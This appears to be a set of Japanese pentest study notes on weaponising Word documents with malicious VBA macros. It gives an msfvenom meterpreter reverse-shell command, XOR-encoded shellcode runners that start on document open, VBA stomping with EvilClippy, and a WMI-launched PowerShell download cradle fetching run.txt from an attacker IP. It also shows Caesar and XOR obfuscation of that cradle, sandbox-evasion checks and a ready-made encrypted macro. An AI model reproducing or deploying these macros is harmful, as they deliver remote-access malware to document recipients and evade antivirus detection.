## XOR Encryption
> [!CAUTION] > windows10環境は32bit版WORDの場合があるので、ペイロードをx86にしておく必要あり

x86版msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f csharp
```

VB用に改造したHelper
```c#
namespace HelperVB
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...};
            byte key = 0x3c;
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ key);
            }
            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach(byte b in encoded)
			{
				hex.AppendFormat("{0:D}, ", b);
			    counter++;
			    if(counter % 50 == 0)
			    {
				    hex.AppendFormat("_{0}", Environment.NewLine);
			    }
			}
			
			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

Sleep + 復号コード
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    Dim t1 As Date
	Dim t2 As Date
	Dim time As Long
	
	t1 = Now()
	Sleep (2000)
	t2 = Now()
	time = DateDiff("s", t1, t2)
	If time < 2 Then
	    Exit Function
	End If
	
    buf = Array(252,73,..)
    For i = 0 To UBound(buf)
	    buf(i) = buf(i) Xor 60
	Next i
	
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Stomping
EvilClippyを使用する(Toolsに保存ずみ)
https://github.com/outflanknl/EvilClippy

vbaが含まれるdocファイルをstomping
```powershell
.\EvilClippy.exe -s .\fakecode.vba -t 2016x86 .\Doc1.doc
```

fakecode.vba
```vb
Sub AutoOpen()
    MsgBox "Hello World"
End Sub
```

## Hiding Powershell
### Dechain

WMIを使用したダウンロードクレードル
```vb
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.217:8000/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

### Encryption
### Caesar
powershellのシーザー暗号での暗号化（出力はクリップボードへ
```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.217:8000/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

復号ルーチンのVBA
```vb
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
	If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
	    Exit Function
	End If
    Dim Apples As String
    Dim Water As String
    
    Apples = "暗号化"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    Mymacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
```

### XOR
暗号化用powershell
```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.217:8000/run.txt'))"
$key = 42 

[string]$output = ""
$payload.ToCharArray() | %{
    [string]$c = ([byte][char]$_ -bxor $key).ToString()
    if    ($c.Length -eq 1) { $c = "00" + $c }
    elseif ($c.Length -eq 2) { $c = "0"  + $c }
    $output += $c
}
Write-Output $output
```

復号
```vb

Function Pears(Beets)
    Pears = Chr(Beets Xor 42)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Oatmilk = ""
    Do
        Oatmilk = Oatmilk + Pears(CInt(Strawberries(Milk)))
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
	Dim t As Date
	t = Now
	Do While DateDiff("s", t, Now) < 5
	    DoEvents
	Loop
	If DateDiff("s", t, Now) < 4 Then Exit Function
	
	If Environ("USERNAME") = "user" Or Environ("USERNAME") = "admin" Then
	    Exit Function
	End If
	
	If Application.Width < 200 Then Exit Function
	
	If Application.RecentFiles.Count < 3 Then Exit Function
	
    If ActiveDocument.Name <> Nuts("ファイル名の暗号文字列") Then
        Exit Function
    End If

    Dim Apples As String
    Dim Water As String

    Apples = "ペイロード暗号化文字列"
    Water = Nuts(Apples)

    GetObject(Nuts("winmgmts:の暗号文字列")).Get(Nuts("Win32_Processの暗号文字列")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    MyMacro
End Sub
```


すでに暗号化してるバージョン
```vb
Function Pears(Beets)
    Pears = Chr(Beets Xor 42)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Oatmilk = ""
    Do
        Oatmilk = Oatmilk + Pears(CInt(Strawberries(Milk)))
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim t As Date
    t = Now
    Do While DateDiff("s", t, Now) < 5
        DoEvents
    Loop
    If DateDiff("s", t, Now) < 4 Then Exit Function
    
    If Environ("USERNAME") = "user" Or Environ("USERNAME") = "admin" Then
        Exit Function
    End If
    
    If Application.Width < 200 Then Exit Function
    
    'If Application.RecentFiles.Count < 3 Then Exit Function
    
    If ActiveDocument.Name <> Nuts("110069073027004078069073") Then
        Exit Function
    End If

    Dim Apples As String
    Dim Water As String

    Apples = "090069093079088089066079070070010007079082079073010072083090075089089010007068069090010007093010066067078078079068010007073010067079082002002068079093007069072064079073094010089083089094079071004068079094004093079072073070067079068094003004078069093068070069075078089094088067068077002013066094094090016005005027019024004027028018004030031004024027029016018026026026005088095068004094082094013003003"
    Water = Nuts(Apples)

    GetObject(Nuts("093067068071077071094089016")).Get(Nuts("125067068025024117122088069073079089089")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    MyMacro
End Sub

```